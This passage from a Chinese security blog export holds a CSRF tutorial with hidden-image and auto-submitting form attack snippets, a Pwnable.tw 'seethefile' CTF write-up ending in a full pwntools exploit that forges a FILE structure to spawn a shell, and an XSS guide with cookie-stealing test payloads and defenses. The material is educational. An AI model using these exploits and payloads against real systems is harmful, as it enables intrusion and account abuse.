XSS攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击XSS容易发现，因为攻击者需要登录后台完成攻击。管理员可以看日志发现攻击者XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie）# CSRF攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击CSRF的攻击一直是管理员自己实现的，攻击者只负责了构造代码CSRF是利用用户当前的身份去做一些未经过授权的操作 用一个小故事简单的介绍一下什么是 CSRF： 我们先假设支付宝存在 CSRF 漏洞，受害者的支付宝账号是alibaba，攻击者的支付宝账号是hacker 然后我们通过网页请求的方式http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=alibaba2可以把账号alibaba的 10000 元转到另外一个账号alibaba2上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的session并且该session的用户已经成功登陆 攻击者在支付宝有账号hacker，并且他知道上文中的 URL 可以进行转账操作，于是他可以发送一个请求http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker到支付宝后台。但是这个请求是来自攻击者而不是来自alibaba，所以不能通过安全认证，因此该请求作废 这时，攻击者hacker想到了用 CSRF 的方式，他自己做了个黄色网站，在网站中放了如下代码：http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker，并且通过黄色链接诱使受害者来访问他的网站。当受害者禁不住诱惑时就会点了进去，上述请求就会从受害者的浏览器发送到支付宝，而且这个请求会附带受害者的浏览器中的cookie 大多数情况下，该请求会失败，因为支付宝会要求受害者的认证信息，但是如果刚访问支付宝不久，还没有关闭支付宝页面，浏览器中的cookie仍然存有认证信息，这个请求就会得到响应，从受害者的账户中转 10000 元到hacker账户里，而受害者丝毫不知情，攻击者拿到钱后逍遥法外 How to AttackCSRF 有两种攻击方式，一种是基于 GET 请求方式的利用，另一种是基于 POST 请求方式的利用。 Get Method12&lt;img src=&apos;https://www.xxx.com/bank.php?transferTo=hacker&apos; width=&apos;0&apos; height=&apos;0&apos; /&gt;&lt;a href=&apos;/test&apos;&gt;start&lt;/a&gt; Post Method123456&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://www.xxx.com/bank.php&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt; &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt; &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt; How to Prevent防范 CSRF 攻击，其实本质就是要求网站能够识别出哪些请求是非正常用户主动发起的。这就要求我们在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求。 Synchronizer token pattern令牌同步模式（Synchronizer token pattern，简称 STP）是在用户请求的页面中的所有表单中嵌入一个 token，在服务端验证这个 token 的技术。token 可以是任意的内容，但是一定要保证无法被攻击者猜测到或者查询到。攻击者在请求中无法使用正确的 token，因此可以判断出未授权的请求 Cookie-to-Header Token对于使用 Js 作为主要交互技术的网站，将 CSRF 的 token 写入到 cookie 中 1Set-Cookie: CSRF-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/ 然后使用 javascript 读取 token 的值，在发送 http 请求的时候将其作为请求的 header 1X-CSRF-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 最后服务器验证请求头中的 token 是否合法 验证码使用验证码可以杜绝 CSRF 攻击，但是这种方式要求每个请求都输入一个验证码，显然没有哪个网站愿意使用这种粗暴的方式，用户体验太差，用户会疯掉的。 验证 HTTP Referer 字段根据 HTTP 协议，在 HTTP 头部中有一个 Referer 字段，它记录了该 HTTP 请求所在的地址，表示 HTTP 请求从那个页面发出的。比如当访问http://zhifubao.com/withdraw?account=lyq&amp;amount=10000&amp;for=xxx，用户必须先登录支付宝网站，然后通过点击页面的的按钮来触发转账事件。此时，转账请求的 Referer 值就是转账页面所在的 URL，通常是以zhifubao.com域名开头的地址。如果攻击者要实行 CSRF 攻击，那么他只能在自己的站点构造请求，此时 Referer 的值就指向黑客自己的网站。因此要防御 CSRF 攻击，支付宝只需要对每一个转账请求验证其 Referer 值，如果是以zhifubao.com开头的域名，则是合法请求，相反，则是非法请求并拒绝。 这种方法的好处就是简单易行，只需要在后台添加一个拦截器来检查 Referer 即可。然而这种办法并不是万无一失，Referer 的值是由浏览器提供的，一些低级的浏览器可以通过某种方式篡改 Referer 的值，这就给了攻击者可乘之机；而一些高级浏览器处于安全考虑，可以让用户设置发送 HTTP 请求时不再提供 Referer 值，这样当他们正常访问支付宝网站时，因为没有提供 Referer 值而被误认为 CERF 攻击，拒绝访问。实际应用中通常采用第二种方法来防御 CSRF 攻击。 尽量使用 POST，限制 GETGET 接口能够直接将请求地址暴露给攻击者，所以要防止 CSRF 一定最好不要用 GET。当然 POST 并不是万无一失，攻击者只需要构造一个 form 表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。 在 HTTP 头部添加自定义属性这种方法也是使用 token 并验证，但是它是把 token 放在 HTTP 请求头部中。通过使用 AJAX 我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成 AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。 Challenges RootMe 解题报告 [Web-Client : CSRF – 0 protection] RootMe 解题报告 [Web-Client : CSRF – token bypass] Referenceshttps://www.freebuf.com/articles/web/55965.htmlhttps://segmentfault.com/a/1190000008505616https://www.jianshu.com/p/855395f9603bhttps://juejin.im/post/5bc009996fb9a05d0a055192https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.htmlhttps://blog.techbridge.cc/2017/02/25/csrf-introduction/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"Pwnable.tw seethefile","slug":"Pwnable-tw-seethefile","date":"2019-08-17T02:43:55.000Z","updated":"2019-08-26T05:51:33.315Z","comments":true,"path":"2019/08/17/Pwnable-tw-seethefile/","link":"","permalink":"qianfei11.coding.me/2019/08/17/Pwnable-tw-seethefile/","excerpt":"Get familiar with _IO_FILE.","text":"Get familiar with _IO_FILE. Intro关于_IO_FILE的结构体： 12345678910111213141516171819202122232425262728293031/* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */struct _IO_FILE&#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 关于vtable的结构： 1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 然后了解一下为什么可以利用fclose函数： 12345678910111213141516171819202122232425262728293031323334353637383940int_IO_new_fclose (FILE *fp)&#123; int status; CHECK_FILE(fp, EOF);#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) /* We desperately try to help programs which are using streams in a strange way and mix old and new functions. Detect old streams here. */ if (_IO_vtable_offset (fp) != 0) return _IO_old_fclose (fp);#endif /* First unlink the stream. */ if (fp-&gt;_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); _IO_acquire_lock (fp); if (fp-&gt;_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); if (fp-&gt;_mode &gt; 0) &#123; /* This stream has a wide orientation. This means we have to free the conversion functions. */ struct _IO_codecvt *cc = fp-&gt;_codecvt; __libc_lock_lock (__gconv_lock); __gconv_release_step (cc-&gt;__cd_in.__cd.__steps); __gconv_release_step (cc-&gt;__cd_out.__cd.__steps); __libc_lock_unlock (__gconv_lock); &#125; else &#123; if (_IO_have_backup (fp)) _IO_free_backup_area (fp); &#125; _IO_deallocate_file (fp); return status;&#125; 通过gdb调试一下，在_IO_new_fclose处下断点： 12345678 0xf76579da: xchg ax,ax 0xf76579dc: xchg ax,ax 0xf76579de: xchg ax,ax=&gt; 0xf76579e0 &lt;_IO_new_fclose&gt;: push ebp 0xf76579e1 &lt;_IO_new_fclose+1&gt;: mov ebp,esp 0xf76579e3 &lt;_IO_new_fclose+3&gt;: push edi 0xf76579e4 &lt;_IO_new_fclose+4&gt;: push esi 0xf76579e5 &lt;_IO_new_fclose+5&gt;: push ebx 接下来一直运行到_IO_new_fclose+132处，调用了_IO_new_file_close_it： 12345678 0xf7657a5e &lt;_IO_new_fclose+126&gt;: je 0xf7657aa8 &lt;_IO_new_fclose+200&gt; 0xf7657a60 &lt;_IO_new_fclose+128&gt;: sub esp,0xc 0xf7657a63 &lt;_IO_new_fclose+131&gt;: push esi=&gt; 0xf7657a64 &lt;_IO_new_fclose+132&gt;: call 0xf7663810 &lt;_IO_new_file_close_it&gt; 0xf7657a69 &lt;_IO_new_fclose+137&gt;: mov edx,DWORD PTR [esi] 0xf7657a6b &lt;_IO_new_fclose+139&gt;: add esp,0x10 0xf7657a6e &lt;_IO_new_fclose+142&gt;: mov edi,eax 0xf7657a70 &lt;_IO_new_fclose+144&gt;: and edx,0x8000 最后call [eax+0x44]，发现这时eax即为vtable的地址，而0x44则为_IO_file_close的偏移： 12345678 0xf7663914 &lt;_IO_new_file_close_it+260&gt;: sub esp,0xc 0xf7663917 &lt;_IO_new_file_close_it+263&gt;: mov eax,DWORD PTR [ebx+eax*1+0x94] 0xf766391e &lt;_IO_new_file_close_it+270&gt;: push ebx=&gt; 0xf766391f &lt;_IO_new_file_close_it+271&gt;: call DWORD PTR [eax+0x44] 0xf7663922 &lt;_IO_new_file_close_it+274&gt;: add esp,0x10 0xf7663925 &lt;_IO_new_file_close_it+277&gt;: mov esi,eax 0xf7663927 &lt;_IO_new_file_close_it+279&gt;: jmp 0xf766384f &lt;_IO_new_file_close_it+63&gt; 0xf766392c &lt;_IO_new_file_close_it+284&gt;: lea esi,[esi+eiz*1+0x0] Analysis1234567root@595b467648a0:~/tmp# checksec ./seethefile[*] '/root/tmp/seethefile' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先用keypatch把alarm给 patch 掉，方便用gdb调试： 1234567891011121314151617181920212223242526272829303132.text:0804870B public init.text:0804870B init proc near ; CODE XREF: main+1C↓p.text:0804870B ; __unwind &#123;.text:0804870B push ebp.text:0804870C mov ebp, esp.text:0804870E sub esp, 8.text:08048711 mov eax, ds:stdout@@GLIBC_2_0.text:08048716 push 0 ; n.text:08048718 push 2 ; modes.text:0804871A push 0 ; buf.text:0804871C push eax ; stream.text:0804871D call _setvbuf.text:08048722 add esp, 10h.text:08048725 sub esp, 8.text:08048728 push offset handler ; handler.text:0804872D push 0Eh ; sig.text:0804872F call _signal.text:08048734 add esp, 10h.text:08048737 sub esp, 0Ch.text:0804873A nop.text:0804873B nop.text:0804873C nop.text:0804873D nop.text:0804873E nop.text:0804873F nop.text:08048740 nop.text:08048741 add esp, 10h.text:08048744 nop.text:08048745 leave.text:08048746 retn.text:08048746 ; &#125; // starts at 804870B.text:08048746 init endp 可以看到是个菜单： 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int argc, const char **argv, const char **envp)&#123; char nptr; // [esp+Ch] [ebp-2Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); init(); welcome(); while ( 1 ) &#123; menu(); __isoc99_scanf(\"%s\", &amp;nptr); switch ( atoi(&amp;nptr) ) &#123; case 1: openfile(); break; case 2: readfile(); break; case 3: writefile(); break; case 4: closefile(); break; case 5: printf(\"Leave your name :\"); __isoc99_scanf(\"%s\", &amp;name); printf(\"Thank you %s ,see you next time\\n\", &amp;name); if ( fp ) fclose(fp); exit(0); return; default: puts(\"Invaild choice\"); exit(0); return; &#125; &#125;&#125; readfile里有一个magicbuf，可以读0x18F个字节，很可能有溢出： 123456789101112int readfile()&#123; int result; // eax memset(magicbuf, 0, 0x190u); if ( !fp ) return puts(\"You need to open a file first\"); result = fread(magicbuf, 0x18Fu, 1u, fp); if ( result ) result = puts(\"Read Successful\"); return result;&#125; 发现在.bss段上可以用magicbuf把fp指针盖掉： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.bss:0804B0C0 public magicbuf.bss:0804B0C0 ; char magicbuf[416].bss:0804B0C0 magicbuf db 1A0h dup(?) ; DATA XREF: openfile+33↑o.bss:0804B0C0 ; readfile+17↑o ....bss:0804B260 public name.bss:0804B260 name db ? ; ; DATA XREF: main+9F↑o.bss:0804B260 ; main+B4↑o.bss:0804B261 db ? ;.bss:0804B262 db ? ;.bss:0804B263 db ? ;.bss:0804B264 db ? ;.bss:0804B265 db ? ;.bss:0804B266 db ? ;.bss:0804B267 db ? ;.bss:0804B268 db ? ;.bss:0804B269 db ? ;.bss:0804B26A db ? ;.bss:0804B26B db ? ;.bss:0804B26C db ? ;.bss:0804B26D db ? ;.bss:0804B26E db ? ;.bss:0804B26F db ? ;.bss:0804B270 db ? ;.bss:0804B271 db ? ;.bss:0804B272 db ? ;.bss:0804B273 db ? ;.bss:0804B274 db ? ;.bss:0804B275 db ? ;.bss:0804B276 db ? ;.bss:0804B277 db ? ;.bss:0804B278 db ? ;.bss:0804B279 db ? ;.bss:0804B27A db ? ;.bss:0804B27B db ? ;.bss:0804B27C db ? ;.bss:0804B27D db ? ;.bss:0804B27E db ? ;.bss:0804B27F db ? ;.bss:0804B280 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r.bss:0804B280 ; openfile+AD↑w ....bss:0804B280 _bss ends.bss:0804B280 同时程序的功能是可以读取文件内容，我们可以通过读取/proc/self/maps来获得libc的地址。 我们所需要做的就是伪造一个文件结构，然后将地址赋予给fp： 找到一个buf1，使得buf1+0x94为_IO_file_jumps结构，同时要注意_vtable_offset要为0，其偏移为0x46且只占一个字节 找到一个buf2，使得buf2+0x44为fclose的地址 最后，写入name覆盖fp到buf Exploit打通了之后发现无法cat flag，在/home/seethefile/下可以看到一个get_flag.c的源文件： 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int read_input(char *buf,unsigned int size)&#123; int ret ; ret = read(0,buf,size); if(ret &lt;= 0)&#123; puts(\"read error\"); exit(1); &#125; if(buf[ret-1] == '\\n') buf[ret-1] = '\\x00'; return ret ;&#125;int main()&#123; char buf[100]; setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); printf(\"Your magic :\"); read_input(buf,40); if(strcmp(buf,\"Give me the flag\"))&#123; puts(\"GG !\"); return 1; &#125; FILE *fp = fopen(\"/home/seethefile/flag\",\"r\"); if(!fp)&#123; puts(\"Open failed !\"); &#125; fread(buf,1,40,fp); printf(\"Here is your flag: %s \\n\",buf); fclose(fp);&#125; 完整的 Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'local = 0if local: p = process('./seethefile') libc = ELF('./libc.so.6')else: p = remote('chall.pwnable.tw', 10200) libc = ELF('./libc_32.so.6')elf = ELF('./seethefile')offset = 0x280 - 0x0C0# gdb.attach(p, 'b *_IO_new_fclose')def cmd(c): p.recvuntil('choice :') p.sendline(str(c))def openfile(filename): cmd(1) p.recvuntil('see :') p.sendline(filename)def readfile(): cmd(2)def writefile(): cmd(3)def closefile(): cmd(4)def exit(name): cmd(5) p.recvuntil('name :') p.sendline(name)openfile('/proc/self/maps')readfile()readfile()writefile()data = p.recvuntil('r-xp')if local: libc_base = int(data.split('-')[0].split('\\n')[1], 16)else: libc_base = int(data.split('-')[-3].split('\\n')[1], 16)info('libc_base = ' + hex(libc_base))buf = 0x0804B260system = libc_base + libc.symbols['system']payload = '/bin/sh'.ljust(0x20, '\\x00')payload += p32(buf)payload = payload.ljust(0x48, '\\x00')payload += p32(buf + 0x10)payload = payload.ljust(0x94, '\\x00')payload += p32(0x804b2f8 - 0x44)payload += p32(system)exit(payload)p.sendline(\"./home/seethefile/get_flag\")p.recvuntil(\"magic :\")p.sendline(\"Give me the flag\\x00\")p.interactive() 修改后的_IO_FILE结构体： 1234567891011121314151617181920212223242526272829303132333435assassinq&gt;&gt; p *((struct _IO_FILE_plus *)0x804B260)$30 = &#123; file = &#123; _flags = 0x6e69622f, _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_end = 0xf75f9700 &quot;&quot;, _IO_buf_base = 0x0, _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x804b270 &lt;name+16&gt;, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &apos;\\000&apos; &lt;repeats 39 times&gt; &#125;, vtable = 0x804b2b4&#125; 修改后的vtable： 123456789101112131415161718192021222324assassinq&gt;&gt; p *((struct _IO_jump_t *)0x804B2B4)$31 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = 0x0, __underflow = 0x0, __uflow = 0x0, __pbackfail = 0x0, __xsputn = 0x0, __xsgetn = 0x0, __seekoff = 0x0, __seekpos = 0x0, __setbuf = 0x0, __sync = 0x0, __doallocate = 0x0, __read = 0x0, __write = 0x0, __seek = 0x804b2b4, __close = 0xf7634da0 &lt;__libc_system&gt;, __stat = 0x0, __showmanyc = 0x0, __imbue = 0x0&#125; Referenceshttps://yuuoniy.github.io/2018/08/14/seethefile-writeup/http://blog.eonew.cn/archives/1123http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"初探跨站脚本攻击（Cross-Site Scripting）","slug":"初探跨站脚本攻击（Cross-Site-Scripting）","date":"2019-08-12T01:13:17.000Z","updated":"2019-08-26T05:45:50.878Z","comments":true,"path":"2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/","link":"","permalink":"qianfei11.coding.me/2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/","excerpt":"最近在做渗透测试，需要接触一些 WEB 方面的基础知识。","text":"最近在做渗透测试，需要接触一些 WEB 方面的基础知识。 IntroXSS 全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为 XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的 web 安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。 注入点： GET 请求参数 POST 请求参数 UA（User Agent） Referer URL … 总共分成三类，存储型 XSS（Stored XSS）、反射型 XSS（Reflected XSS）和DOM-based XSS。几种攻击方式的图解可以参考绿盟的这篇文章，三种 XSS 可以参考这篇文章在本地测试 存储型 XSS也叫持久型 XSS，那些将恶意脚本永久的保存在目标服务器上的攻击方式，如存储在数据库、消息论坛、访问日志、评论内容扥等。Payload 是有经过存储的，当一个页面存在存储型 XSS 的时候，XSS 注入成功后，那么每次访问该页面都将触发 XSS。 Examplehttp://www.secist.com/archives/5388.html 反射型 XSS也叫非持久型 XSS，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。最常见的是 Payload 是构造在网址的某个 GET 参数的值里。 Examplehttps://blog.csdn.net/binyao02123202/article/details/9041113 DOM-Based 型 XSS攻击者利用原生 JavaScript 代码篡改客户端的 DOM 结构，导致用户操作执行了“意外”的动作。 Example12345678910111213141516Select your language:&lt;select &gt;&lt;script&gt; document.write( \"&lt;OPTION value=1&gt;\" + document.location.href.substring( document.location.href.indexOf(\"default=\") + 8 ) + \"&lt;/OPTION&gt;\" ); document.write(\"&lt;OPTION value=2&gt;English&lt;/OPTION&gt;\"); &lt;/script&gt;&lt;/select&gt;… 网站 URL 则为这个样子： 1http://www.some.site/page.html?default=French 利用这个页面 DOM 结构的漏洞，向受害者发送下面的链接，点开这个链接就会将用户的 cookie 全部 alert 出来了： 1http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt; How to TestWhere 直接插入到script标签里 插入到html注释里 插入到html标签的属性名里 插入到html标签的属性值里 作为html标签的名字 直接插入到css里 Manually 参数中提交xss payload代码 在所有可以提交参数并能在页面返回的位置上 url的每一个参数 url本身 表单 搜索框 … Usual Scene 重灾区——评论区、留言区、个人信息、订单信息等 针对型——站内信、网页即时通讯、私信、意见反馈等 存在风险——搜索框、当前目录、图片属性等 Payloadshttps://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txthttps://github.com/ismailtasdelen/xss-payload-list How to AvoidBasic不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方 &lt;script&gt;...永远不要把不受信任的数据放在这...&lt;/script&gt;：直接放在 script 标签内 &lt;!--...永远不要把不受信任的数据放在这...--&gt;：放在 HTML 注释内 &lt;div ...永远不要把不受信任的数据放在这...=test /&gt;：做为一个属性名 &lt;永远不要把不受信任的数据放在这... href=&quot;/test&quot; /&gt;：做为一个标签名 &lt;style&gt;...永远不要把不受信任的数据放在这...&lt;/style&gt;：直接放在 style 标签内复制代码原则 1——在向元素中插入不受信任的 HTML 代码之前一定要进行转义 在向元素中插入不受信任的 HTML 代码之前一定要进行转义 &lt;body&gt;...将不受信任的数据转义后再放在这...&lt;/body&gt; &lt;div&gt;...将不受信任的数据转义后再放在这...&lt;/div&gt; … 常用的转义规则如下： 字符 转义后的字符 &amp; &amp;amp; &lt; &amp;lt; &gt; &amp;gt; &quot; &amp;quot; &#39; &amp;#x27; / &amp;#x2F; 向元素的属性插入不受信任的 HTML 代码之前一定要进行转义 &lt;div attr=...将不受信任的数据转义后再放在这...&gt;content&lt;/div&gt;：在没有加引号的属性值内 &lt;div attr=&#39;...将不受信任的数据转义后再放在这...&#39;&gt;content&lt;/div&gt;：在加了单引号的属性值内 &lt;div attr=&quot;...将不受信任的数据转义后再放在这...&quot;&gt;content&lt;/div&gt;：在加了双引号的属性值内 用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义 &lt;script&gt;alert(&#39;...将不受信任的数据转义后再放在这...&#39;)&lt;/script&gt;：在一个字符串之内 &lt;script&gt;x=&#39;...将不受信任的数据转义后再放在这...&#39;&lt;/script&gt;：在表达式的一侧 &lt;div onmouseover=&quot;x=&#39;...将不受信任的数据转义后再放在这...&#39;&quot;&lt;/div&gt;：在事件处理函数内 有一些 JavaScript 函数永远无法安全的使用不受信任的数据作为输入： 123&lt;script&gt; window.setInterval(\"即使你做了转义，但是仍然可能被XSS攻击\");&lt;/script&gt; 在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值一定要确保http response中的头部信息的content-type为application/json，而不是text/html，因为那样的话，很可能会被人利用进行 XSS 攻击： 1234567891011HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: text/html; charset=utf-8 &lt;-- bad...Content-Length: 373Keep-Alive: timeout=5, max=100Connection: Keep-Alive&#123;&quot;Message&quot;:&quot;No HTTP resource was found that matches the request URI &apos;dev.net.ie/api/pay/.html?HouseNumber=9&amp;AddressLine=The+Gardens&lt;script&gt;alert(1)&lt;/script&gt;&amp;AddressLine2=foxlodge+woods&amp;TownName=Meath&apos;.&quot;,&quot;MessageDetail&quot;:&quot;No type was foundthat matches the controller named &apos;pay&apos;.&quot;&#125; &lt;-- 这里script标签有可能会被执行 使用application/json就不会被利用： 12345HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: application/json; charset=utf-8 &lt;--good... 将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义 &lt;style&gt;selector { property : ...将不受信任的数据转义后再放在这...; } &lt;/style&gt;：属性值 &lt;style&gt;selector { property : &quot;...将不受信任的数据转义后再放在这...&quot;; } &lt;/style&gt;：属性值 &lt;span style=&quot;property : ...将不受信任的数据转义后再放在这...&quot;&gt;text&lt;/span&gt;：属性值 有一些css属性值对于不受信任的数据是无法确保万无一失的——即使做了转义，如下面的两个css属性： 123456 &#123; background-url: \"javascript:alert(1)\";&#125; &#123; text-size: \"expression(alert('XSS'))\";&#125; // only in IE 应该确保所有 CSS 属性值引入的外部链接是由http开头的，而不是javascript开头的 向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义123&lt;a href=\"http://www.somesite.com?test=...将不受信任的数据转义后再放在这...\"&gt; link&lt;/a&gt; Better对于 cookie 使用 httpOnly 标识使用httpOnly标识后的cookie JavaScript是无法获取的，又由于cookie是基于同源原则，所以一定程度上会防范那些利用客户cookie的XSS攻击。 在 http header 中使用 Content Security Policy利用http header中的属性值Content-Security-Policy来防范XSS。HTTP响应头中Content-Security-Policy允许站点管理者在指定的页面控制用户代理的资源。除了少数例外，这条政策将极大地指定服务源以及脚本端点。 使用自动转义模板系统许多 Web 应用程序框架提供了自动的上下文转义功能，如AngularJS严格的上下文转义和Go模板。尽可能使用这些技术。 在 http header 中使用 X-XXS-Protectionhttp header中X-XSS-Protection响应头是Internet Explorer、Chrome和Safari的一个功能，当检测到跨站脚本攻击时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的Content-Security-Policy来禁用内联的JavaScript (&#39;unsafe-inline&#39;)时, 他们仍然可以为尚不支持CSP的旧版浏览器的用户提供保护。 Games alert(1) to win —&gt; alert(1) to win payloads prompt(1) to win —&gt; XSSChallengeWiki - prompt.ml XSS game area —&gt; 玩转 Google 的 XSS 游戏 XSS Challenges —&gt; Solutions to the wargame XSS Challenges Advanced 如何防止 XSS 攻击 XSS with length restriction XSS 过滤绕过速查表 XSS 攻击进阶篇——那些年我们看不懂的 XSS XSS 攻击冷门花样玩法总结 戏耍 XSS 的一些技巧 Bypass xss 过滤的测试方法 Referenceshttps://juejin.im/post/5bcc9487518825780e6eaf12https://www.fooying.com/the-art-of-xss-1-introduction/http://blog.nsfocus.net/xss-start-finish/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"解决gef missing问题","slug":"解决gef-missing问题","date":"2019-08-11T08:50:36.000Z","updated":"2019-09-07T13:28:47.787Z","comments":true,"path":"2019/08/11/解决gef-missing问题/","link":"","permalink":"qianfei11.coding.me/2019/08/11/解决gef-missing问题/","excerpt":"用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 gef missing ，强迫症决定把他都搞定。","text":"用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 gef missing ，强迫症决定把他都搞定。 Environment1234567891011121314151617181920212223242526272829303132➜ ~ uname -aLinux ubuntu 4.4.0-92-generic #115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux➜ ~ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 16.04.6 